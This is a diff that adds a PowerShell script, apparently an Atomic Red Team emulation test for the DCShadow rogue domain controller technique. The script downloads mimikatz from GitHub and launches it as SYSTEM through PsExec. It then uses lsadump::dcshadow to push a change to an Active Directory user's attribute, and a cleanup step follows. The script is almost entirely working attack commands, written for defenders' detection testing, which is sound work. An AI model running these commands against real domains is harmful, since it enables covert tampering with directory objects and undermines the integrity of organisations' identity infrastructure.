@@ -1,0 +1,43 @@
+#TechniqueName: Rogue Domain Controller
+#AtomicTestName: DCShadow - Mimikatz
+#Language: ps1
+
+#get_prereq_commands
+$mimikatz_path = cmd /c echo $env:TEMP\mimikatz\x64\mimikatz.exe
+Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+
+
+#prereq_commands
+$mimikatz_path = cmd /c echo $env:TEMP\mimikatz\x64\mimikatz.exe
+if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+
+
+#commands
+# starting fake DC server, as SYSTEM (required)
+$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
+Remove-Item $dc_output_file -ErrorAction Ignore
+$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`" `"exit`""
+$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c C:\PSTools\PsExec.exe /accepteula -d -s $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatzParam"
+
+# wait for fake DC server to be ready...
+Start-Sleep -Seconds 5
+
+# server ready, so trigger replication (push) and wait until it finished
+& $env:TEMP\mimikatz\x64\mimikatz.exe "lsadump::dcshadow /push" "exit"
+
+Write-Host "`nWaiting for fake DC server to return"
+Wait-Process $dc
+
+Write-Host "`nOutput from fake DC server:"
+Get-Content $dc_output_file
+Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
+Remove-Item $dc_output_file -ErrorAction Ignore
+
+Write-Host "End of DCShadow"
+
+
+#cleanup_commands
+Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
